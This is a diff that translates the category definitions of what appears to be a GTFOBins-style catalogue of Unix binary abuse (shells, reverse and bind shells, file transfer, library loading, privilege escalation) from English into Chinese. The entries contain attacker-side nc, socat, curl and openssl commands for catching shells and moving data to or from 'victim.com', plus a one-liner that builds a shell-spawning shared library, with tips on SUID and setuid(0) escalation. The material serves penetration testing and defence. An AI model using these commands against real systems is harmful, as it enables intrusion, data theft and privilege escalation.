@@ -1,25 +1,25 @@
 shell:
-  label: Shell
-  description: This executable can spawn an interactive system shell.
+  label: 交互 Shell
+  description: 此可执行文件可以生成交互式系统 shell。
   mitre:
   - T1059
   extra:
     tty: &tty
-      false: The spawned shell is just a dummy REPL that can only run simple terminal commands.
+      false: 生成的 shell 只是一个简易 REPL，只能运行简单的终端命令。
     blind: &blind
-      true: The commands are executed but their output is hidden from the attacker.
+      true: 命令会被执行，但输出不会返回给操作者。
 
 command:
-  label: Command
-  description: This executable can run non-interactive system commands.
+  label: 命令执行
+  description: 此可执行文件可以运行非交互式系统命令。
   mitre:
   - T1059
   extra:
     blind: *blind
 
 reverse-shell:
-  label: Reverse shell
-  description: This executable can send back a reverse system shell to a listening attacker.
+  label: 反弹 shell
+  description: 此可执行文件可以向正在监听的操作者回连一个系统 shell。
   mitre:
   - T1059
   - T1071
@@ -28,20 +28,20 @@ reverse-shell:
     blind: *blind
     listener:
       tcp-server:
-        comment: A TCP server can be used on the attacker box to receive the shell.
+        comment: 可在操作者主机上使用 TCP 服务端接收 shell。
         code: nc -l -p 12345
       tcp-server-tty:
-        comment: A TCP server can be used on the attacker box to receive the shell.
+        comment: 可在操作者主机上使用 TCP 服务端接收 shell。
         code: socat file:/dev/tty,raw,echo=0 tcp-listen:12345
       tls-server:
-        comment: A TLS server can be used on the attacker box to receive the shell.
+        comment: 可在操作者主机上使用 TLS 服务端接收 shell。
         code: |-
           openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
           openssl s_server -quiet -key key.pem -cert cert.pem -port 12345
 
 bind-shell:
-  label: Bind shell
-  description: This executable can bind a system shell to a local port waiting for an attacker to connect.
+  label: 绑定 shell
+  description: 此可执行文件可以把系统 shell 绑定到本地端口，等待操作者连接。
   mitre:
   - T1059
   - T1071
@@ -50,113 +50,113 @@ bind-shell:
     blind: *blind
     connector:
       tcp-client:
-        comment: A TCP client can be used on the attacker box to connect to the shell.
+        comment: 可在操作者主机上使用 TCP 客户端连接到 shell。
         code: nc victim.com 12345
       tcp-client-tty:
-        comment: A TCP client can be used on the attacker box to receive the shell.
+        comment: 可在操作者主机上使用 TCP 客户端连接到 shell。
         code: socat file:/dev/tty,raw,echo=0 tcp:victim.com:12345
 
 file-write:
-  label: File write
-  description: This executable can write data to local files.
+  label: 文件写入
+  description: 此可执行文件可以向本地文件写入数据。
   mitre:
   - T1565
   extra:
     binary: &binary
-      false: The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data.
+      false: 内容会被该过程损坏或修改，因此可能不适合处理任意二进制数据。
 
 file-read:
-  label: File read
-  description: This executable can read data from local files.
+  label: 文件读取
+  description: 此可执行文件可以读取本地文件数据。
   mitre:
   - T1005
   extra:
     binary: *binary
 
 upload:
-  label: Upload
-  description: This executable can upload local data.
+  label: 上传
+  description: 此可执行文件可以上传本地数据。
   mitre:
   - T1041
   extra:
     binary: *binary
     receiver:
       tcp-client:
-        comment: A TCP client can be used on the attacker box to receive the data.
+        comment: 可在操作者主机上使用 TCP 客户端接收数据。
         code: nc victim.com 12345 >/path/to/output-file
       tcp-server:
-        comment: A TCP server can be used on the attacker box to receive the data.
+        comment: 可在操作者主机上使用 TCP 服务端接收数据。
         code: nc -l -p 12345 >/path/to/output-file
       http-client:
-        comment: An HTTP client can be used on the attacker box to receive the data.
+        comment: 可在操作者主机上使用 HTTP 客户端接收数据。
         code: curl victim.com -o /path/to/output-file
       http-server:
-        comment: An HTTP server can be used on the attacker box to receive the data.
+        comment: 可在操作者主机上使用 HTTP 服务端接收数据。
         code: nc -l -p 80 | awk 'BEGIN {RS="\r\n\r\n";ORS=""} NR==2' >/path/to/output-file
       ftp-server:
-        comment: An FTP server can be used on the attacker box to receive the data.
+        comment: 可在操作者主机上使用 FTP 服务端接收数据。
         code: python -m pyftpdlib -w -p 21
       ssh-server:
-        comment: An SSH server can be used on the attacker box to receive the data.
+        comment: 可在操作者主机上使用 SSH 服务端接收数据。
       tls-server:
-        comment: A TLS server can be used on the attacker box to receive the data.
+        comment: 可在操作者主机上使用 TLS 服务端接收数据。
         code: |-
           openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
           openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 >/path/to/output-file
 
 download:
-  label: Download
-  description: This executable can download remote data.
+  label: 下载
+  description: 此可执行文件可以下载远程数据。
   mitre:
   - T1105
   extra:
     binary: *binary
     sender:
       tcp-client:
-        comment: A TCP client can be used on the attacker box to send the data.
+        comment: 可在操作者主机上使用 TCP 客户端发送数据。
         code: nc victim.com 12345 </path/to/input-file
       tcp-server:
-        comment: A TCP server can be used on the attacker box to send the data.
+        comment: 可在操作者主机上使用 TCP 服务端发送数据。
         code: nc -l -p 12345 </path/to/input-file
       http-client:
-        comment: An HTTP client can be used on the attacker box to send the data.
+        comment: 可在操作者主机上使用 HTTP 客户端发送数据。
         code: curl victim.com --data-binary @/path/to/input-file
       http-server:
-        comment: An HTTP server can be used on the attacker box to send the data.
+        comment: 可在操作者主机上使用 HTTP 服务端发送数据。
         code: python -m http.server 80
       ftp-server:
-        comment: An FTP server can be used on the attacker box to send the data.
+        comment: 可在操作者主机上使用 FTP 服务端发送数据。
         code: python -m pyftpdlib -w -p 21
       ssh-server:
-        comment: An SSH server can be used on the attacker box to send the data.
+        comment: 可在操作者主机上使用 SSH 服务端发送数据。
       tls-server:
-        comment: A TLS server can be used on the attacker box to send the data.
+        comment: 可在操作者主机上使用 TLS 服务端发送数据。
         code: |-
           openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
           openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 </path/to/input-file
 
 library-load:
-  label: Library load
-  description: This executable can load shared libraries that may be used to run arbitrary code in the same execution context.
+  label: 加载共享库
+  description: 此可执行文件可以加载共享库，从而可能在相同执行上下文中运行任意代码。
   mitre:
   - T1574
   extra:
     payload: |-
-      As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:
+      例如，可以使用以下命令创建一个最小共享库（`lib.so`），它会在加载时生成 shell：
 
       ```
       echo '__attribute__((constructor)) init() { execl("/bin/sh", "sh", 0); }' \
           | gcc -w -fPIC -shared -o lib.so -x c -
       ```
 
-      Add the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned.
+      在 SUID 上下文中，按常规为 shell 添加 `-p` 参数。如果可执行文件拥有 `CAP_SETUID` capability，可考虑预先调用 `setuid(0);`。
 
 privilege-escalation:
-  label: Privilege escalation
-  description: This executable provides a mechanism for privilege escalation by indirectly enabling elevated privileges, such as setting the SUID bit or modifying the ownership of another executable.
+  label: 权限提升
+  description: 此可执行文件可通过间接方式启用更高权限，例如设置 SUID 位或修改另一个可执行文件的所有权，从而提供权限提升机制。
   mitre:
   - T1548
 
 inherit:
-  label: Inherit
-  description: This executable can inherit functions from another.
+  label: 继承
+  description: 此可执行文件可以继承另一个条目的功能。
